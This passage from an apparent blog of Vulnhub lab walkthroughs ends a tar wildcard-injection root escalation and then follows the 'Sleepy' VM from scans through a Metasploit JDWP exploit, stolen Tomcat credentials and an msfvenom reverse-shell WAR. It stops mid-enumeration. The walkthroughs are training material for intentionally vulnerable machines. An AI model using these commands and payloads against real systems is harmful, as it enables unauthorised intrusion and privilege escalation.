</pre></td><td class='code'><pre><code class=''><span class='line'># ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 44
</span><span class='line'>-rw-r--r-- 1 www-data www-data     1 Nov 22 08:07 --checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rw-r--r-- 1 www-data www-data     1 Nov 22 08:07 --checkpoint=1
</span><span class='line'>drwxrwxrwx 2 rene     rene      4096 Nov 24 05:40 .
</span><span class='line'>drwxr-xr-x 3 rene     rene      4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r--r-- 1 rene     rene     20927 Nov 24 05:40 backup.tar.gz
</span><span class='line'>-rw-r--r-- 1 root     root         0 Nov 24 05:40 done
</span><span class='line'>-rwxr-xr-x 1 www-data www-data    49 Nov 23 07:03 shell.sh</span></code></pre></td></tr></table></div></figure>


<p>Now it is ready to run <code>/bin/dash</code> and enjoy the ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ /bin/dash
</span><span class='line'>/bin/dash
</span><span class='line'># id
</span><span class='line'>id
</span><span class='line'>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
</span><span class='line'># whoami
</span><span class='line'>whoami
</span><span class='line'>root
</span><span class='line'># ls -al /root
</span><span class='line'>ls -al /root
</span><span class='line'>total 28
</span><span class='line'>drwx------  2 root root 4096 Jul  9 13:53 .
</span><span class='line'>drwxr-xr-x 22 root root 4096 Jul  5 14:01 ..
</span><span class='line'>lrwxrwxrwx  1 root root    9 Jul  5 14:12 .bash_history -> /dev/null
</span><span class='line'>-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
</span><span class='line'>lrwxrwxrwx  1 root root    9 Jul  9 13:53 .nano_history -> /dev/null
</span><span class='line'>-rw-r--r--  1 root root  140 Nov 20  2007 .profile
</span><span class='line'>-rwx------  1 root root  120 Jul  6 08:59 create_backup.sh
</span><span class='line'>-rw-------  1 root root 4251 Jul  6 10:41 flag.txt
</span><span class='line'># cat /root/flag.txt
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>                                                                   .aMMMMMMMMn.  ,aMMMMn.
</span><span class='line'>                                                                 .aMccccccccc*YMMn.    `Mb
</span><span class='line'>                                                                aMccccccccccccccc*Mn    MP
</span><span class='line'>                                                               .AMMMMn.   MM `*YMMY*ccaM*
</span><span class='line'>                                                              dM*  *YMMb  YP        `cMY
</span><span class='line'>                                                              YM.  .dMMP   aMn.     .cMP
</span><span class='line'>                                                               *YMMn.     aMMMMMMMMMMMY'
</span><span class='line'>                                                                .'YMMb.           ccMP
</span><span class='line'>                                                             .dMcccccc*Mc....cMb.cMP'
</span><span class='line'>                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
</span><span class='line'>                                                          dY*'  '*M;ccccMM..dMMM..MP*cc*Mb
</span><span class='line'>                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
</span><span class='line'>                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
</span><span class='line'>                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
</span><span class='line'>                                                          Yb;cc;dMMMMMMMMMMMP*'  *YMMP*
</span><span class='line'>                                                           *YMMMPYMMMMMMP*'          curchack
</span><span class='line'>                                                       +####################################+
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       +----------------------------------+-+
</span><span class='line'>                                                        ####################################
</span><span class='line'>                                                             |======                  |
</span><span class='line'>                                                             |======                  |
</span><span class='line'>                                                             |=====                   |
</span><span class='line'>                                                             |====                    |
</span><span class='line'>                                                             |                        |
</span><span class='line'>                                                             +                        +
</span><span class='line'>
</span><span class='line'> .d8888b.                 d8b          d8b               888                                                                    d8b
</span><span class='line'>d88P  Y88b                Y8P          88P               888                                                                    Y8P
</span><span class='line'>888    888                             8P                888
</span><span class='line'>888        .d88b.  .d8888b888   88888b."  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
</span><span class='line'>888       d8P  Y8bd88P"   888   888 "88b d8P  Y8b88K     888      888 "88b    "88b88K        888  888888 "88bd8P  Y8b   888 "88b888888 "88bd8P  Y8b
</span><span class='line'>888    88888888888888     888   888  888 88888888"Y8888b.888      888  888.d888888"Y8888b.   888  888888  88888888888   888  888888888  88888888888
</span><span class='line'>Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
</span><span class='line'> "Y8888P"  "Y8888  "Y8888P888   888  888  "Y8888  88888P' "Y888   88888P" "Y888888 88888P'    "Y88888888  888 "Y8888    88888P" 88888888P"  "Y8888Y8P
</span><span class='line'>                                                                  888                                                   888        888
</span><span class='line'>                                                                  888                                                   888        888
</span><span class='line'>                                                                  888                                                   888        888
</span><span class='line'>Well Done!
</span><span class='line'>Here's your flag: 0089cd4f9ae79402cdd4e7b8931892b7</span></code></pre></td></tr></table></div></figure>




<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Sleepy]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/11/13/vulnhub-sleepy/"/>
    <updated>2015-11-13T16:44:46+11:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/11/13/vulnhub-sleepy</id>
    <content type="html"><![CDATA[<p><strong>/dev/random: Sleepy</strong> is the latest one in the series <strong>/dev/random</strong>, which is created by <a href="https://www.vulnhub.com/author/sagi-,36/">Sagi-</a>.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/devrandom-sleepy,123/">here</a>.</p>

<!-- more -->


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/sleepy/sleepy.png"></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: /dev/random: Sleepy (<em>10.1.1.142/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Analysed and found vulnerable application / service (JDWP running on port 9001) and the vulnerability is <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger" title="JDWP Remote Code Execution"><strong>Java Debug Wire Protocol Remote Code Execution</strong></a></li>
<li>Exploit JDWP vulnerability and get shell with limited &lsquo;sleepy&rsquo; privilege</li>
<li>Searching and find Tomcat&rsquo;s admin login credential which stored in the default file: <font color="green"><em>/etc/tomcat/tomcat-users.xml</em></font></li>
<li>Set up Kali and log in to Tomcat manager page with admin priviledge, then generate, upload and deploy the evil WAR file to target server</li>
<li>Set up MSF and then get a reverse shell back by accessing the evil page I deployed previously, now we get a new shell with the priviledge of &lsquo;tomcat&rsquo;</li>
<li>Enumerating and find vulnerable binary &lsquo;/usr/bin/nightmare&rsquo; which has sticky bit set and belong to ROOT group.</li>
<li>Analysed and exploit &lsquo;/usr/bin/nightmare&rsquo; to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Search and found JDWP remote code vulnerability which can be exploited to get shell</li>
<li>Enumerate and found tomcat&rsquo;s login configuration file in the default location (/etc/tomcat/tomcat-users.xml)</li>
<li>Set up Kali2 and log in to Tomcat&rsquo;s manager page with the credential found previously</li>
<li>Generate evil WAR file by using <strong>msfvenom</strong>, then upload and deploy on Tomcat server</li>
<li>Set up MSF console and trigging the reverse shell by accessing the evil page deployed before [<font color="FF8000">Metasploit</font>]</li>
<li>With the priveilege of tomcat, enumerate and find vulnerable binary <code>/usr/bin/nightmare</code> which has sticky bit set and in ROOT group</li>
<li>Download <code>/usr/bin/nightmare</code> to local, analyse with <code>radare2</code> and exploit it to get ROOT [<font color="FF8000">radare2</font>]</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://www.metasploit.com/">Metasploit</a></li>
<li><a href="https://github.com/radare/radare2">radare2</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.142 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.142    00:0c:29:0b:18:9f   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:ed:31:70   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">6</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.529 seconds <span class="o">(</span>101.23 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p>10.1.1.142 is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.142/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2015-11-06 09:49:16 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 8009/tcp on 10.1.1.142
</span><span class='line'>Discovered open port 21/tcp on 10.1.1.142
</span><span class='line'>Discovered open port 9001/tcp on 10.1.1.142
</span></code></pre></td></tr></table></div></figure>


<p>Now there are 3 ports (21, 8009, 9001) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA4 scan initiated Fri Nov  6 04:51:36 2015 as: nmap -sV -v -A -T4 -O -p 8009,21,9001 -oN 10.1.1.142_nmap.txt 10.1.1.142</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.142
</span><span class='line'>Host is up <span class="o">(</span>0.00063s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>21/tcp   open  ftp     vsftpd 2.0.8 or later
</span><span class='line'><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_Can<span class="err">&#39;</span>t get directory listing: TIMEOUT
</span><span class='line'>8009/tcp open  ajp13   Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_ajp-methods: Failed to get a valid response <span class="k">for</span> the OPTION request
</span><span class='line'>9001/tcp open  jdwp    Java Debug Wire Protocol <span class="o">(</span>Reference Implementation<span class="o">)</span> version 1.6 1.7.0_71
</span><span class='line'>MAC Address: 00:0C:29:0B:18:9F <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 2.6.X<span class="p">|</span>3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
</span><span class='line'>Uptime guess: 0.002 days <span class="o">(</span>since Fri Nov  <span class="m">6</span> 04:49:25 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>... turncate ...
</span></code></pre></td></tr></table></div></figure>


<p>I checked the FTP first and from the <code>nmap</code> scanning result, Anonymous login allowed. However, there is only one PNG file (sleepy.png) in <code>pub</code> folder and there is no permission to upload file through anonymous account. Nothing can be found in the PNG file, so I move on.</p>

<p>Next is port 8009, ajp13 Apache JServ. This <a href="http://insight-labs.org/?p=1095" title="Exploit on Tomcat with AJP">blog</a> described a method to exploit Tomcat with AJP protocol. The good news is that I can touch the login page of Tomcat manager. However, after several failed trials, I still could not manage the login credential. Have to leave it for now and move on :(</p>

<p>The third open port is 9001 which Java Debug Wire Protocol is running on it. By searching online for any exist exploit, I found this <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger" title="JDWP Remote Code Execution">JDWP Remote Code Execution</a>.</p>

<p>Then I startup Metasploit console and get a reverse shell with this JDWP exploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; search jdwp
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Module database cache not built yet, using slow search
</span><span class='line'>
</span><span class='line'>Matching <span class="nv">Modules</span>
</span><span class='line'><span class="o">================</span>
</span><span class='line'>
</span><span class='line'>   Name                                   Disclosure Date  Rank  Description
</span><span class='line'>   ----                                   ---------------  ----  -----------
</span><span class='line'>   exploit/multi/misc/java_jdwp_debugger  2010-03-12       good  Java Debug Wire Protocol Remote Code Execution
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf &gt; use exploit/multi/misc/java_jdwp_debugger
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>RHOST 10.1.1.142
</span><span class='line'><span class="nv">RHOST</span> <span class="o">=</span>&gt; 10.1.1.142
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>RPORT 9001
</span><span class='line'><span class="nv">RPORT</span> <span class="o">=</span>&gt; 9001
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/meterpreter/reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/meterpreter/reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>LHOST 10.1.1.130
</span><span class='line'><span class="nv">LHOST</span> <span class="o">=</span>&gt; 10.1.1.130
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; check
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - The target appears to be vulnerable.
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 10.1.1.130:4444
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Retrieving the sizes of variable sized data types in the target VM...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Getting the version of the target VM...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Getting all currently loaded classes by the target VM...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Getting all running threads in the target VM...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Setting <span class="s1">&#39;step into&#39;</span> event...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Resuming VM and waiting <span class="k">for</span> an event...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Received <span class="m">1</span> responses that are not a <span class="s1">&#39;step into&#39;</span> event...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Deleting step event...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Disabling security manager <span class="k">if</span> set...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> 10.1.1.142:9001 - Security manager was not <span class="nb">set</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Dropping and executing payload...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Transmitting intermediate stager <span class="k">for</span> over-sized stage...<span class="o">(</span><span class="m">105</span> bytes<span class="o">)</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1495598</span> bytes<span class="o">)</span> to 10.1.1.142
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:4444 -&gt; 10.1.1.142:35957<span class="o">)</span> at 2015-11-06 08:08:24 -0500
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Deleted /tmp/zNfkVK
</span><span class='line'>
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer     : sleepy
</span><span class='line'>OS           : Linux sleepy 3.10.0-123.13.2.el7.x86_64 <span class="c">#1 SMP Thu Dec 18 14:09:13 UTC 2014 (x86_64)</span>
</span><span class='line'>Architecture : x86_64
</span><span class='line'>Meterpreter  : x86/linux
</span><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process <span class="m">2878</span> created.
</span><span class='line'>Channel <span class="m">1</span> created.
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-4.2<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:initrc_t:s0
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span></code></pre></td></tr></table></div></figure>


<p>Cool~ Now I get in as user <code>sleepy</code>!</p>

<p>Next thing is to find login credential of Tomcat manager page.</p>

<p>After poking around in the file system, I found the default Tomcat users file <code>/etc/tomcat/tomcat-users.xml</code>:</p>

<p>File /etc/tomcat/tomcat-users.xml could not be found</p>

<p>At the bottom of the xml file, I found the tomcat login credential in plaintext: <code>sl33py / Gu3SSmYStR0NgPa$sw0rD!</code>!</p>

<p>Now, we are on the right track and the next thing is getting clear:</p>

<p>Run <code>msfvenom</code> as follow to generate evil WAR file with reverse shell payload.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">## create evil WAR file with reverse shell payload</span>
</span><span class='line'>root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.1.1.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">8888</span> -f war &gt; sleepy.war
</span><span class='line'>
</span><span class='line'><span class="c">## check the WAR file and note the evil page: atodruyscupc.jsp </span>
</span><span class='line'>root@kali:~# jar -xvf sleepy.war
</span><span class='line'> inflated: META-INF/MANIFEST.MF
</span><span class='line'>  created: WEB-INF/
</span><span class='line'> inflated: WEB-INF/web.xml
</span><span class='line'> inflated: atodruyscupc.jsp
</span><span class='line'> inflated: VFTwyDWxQug.txt
</span></code></pre></td></tr></table></div></figure>


<p>After upload and deployed the WAR file on target Tomcat server, I set up Metasploit console and access the target page <code>http://10.1.1.130/sleepy/atodruyscupc.jsp</code> to get a shell back as user <code>tomcat</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>linux/x86/meterpreter/reverse_tcp<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name          Current Setting  Required  Description
</span><span class='line'>   ----          ---------------  --------  -----------
</span><span class='line'>   DebugOptions  <span class="m">0</span>                no        Debugging options <span class="k">for</span> POSIX meterpreter
</span><span class='line'>   LHOST         10.1.1.130       yes       The listen address
</span><span class='line'>   LPORT         <span class="m">8888</span>             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   <span class="m">0</span>   Wildcard Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>ExitOnSession <span class="nb">false </span>
</span><span class='line'><span class="nb"> </span><span class="nv">ExitOnSession</span> <span class="o">=</span>&gt; <span class="nb">false</span>
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit -j -z
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 10.1.1.130:8888
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:8888 -&gt; 10.1.1.142:38614<span class="o">)</span> at 2015-11-06 22:07:09 -0500
</span><span class='line'>
</span><span class='line'>python -c <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot;</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/usr/share/tomcat
</span><span class='line'>bash-4.2<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we have escaped priviledge to <code>tomcat</code> successfully!</p>

<p>After enmueration (<a href="https://blog.g0tmi1k.com/">g0tmi1k</a> has made a really helpful guide for enumerating and you can find it <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="Basic Linux Privilege Escalation">here</a>), I found one suspected binary file <code>/usr/bin/nightmare</code> which has sticky bit set and belong to ROOT group.</p>

